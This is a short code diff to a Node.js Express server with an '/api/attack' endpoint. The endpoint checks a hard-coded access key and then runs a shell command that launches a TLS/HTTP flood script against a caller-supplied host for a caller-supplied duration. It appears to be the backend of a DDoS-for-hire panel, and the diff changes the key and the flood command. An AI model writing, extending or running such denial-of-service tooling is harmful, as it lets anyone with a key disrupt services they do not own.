@@ -21,7 +21,7 @@ app.get("/api/attack", (req, res) => {
     return res.status(400).send(err_u);
   }
 
-  if (key !== "huyduc") {
+  if (key !== "duong") {
     const err_key = {
       status: `error`,
       message: `Error Keys`,
@@ -102,7 +102,7 @@ app.get("/api/attack", (req, res) => {
   };
 
   if (method.toLowerCase() === "tlsv2") {
-    executeCommand(`node brave ${host} ${time} 64 3 flood.txt --dual`, 
+    executeCommand(`node @.js.2 ${host} ${time} 5 http.txt 50 flood true`, 
     () => {}
     );
   }
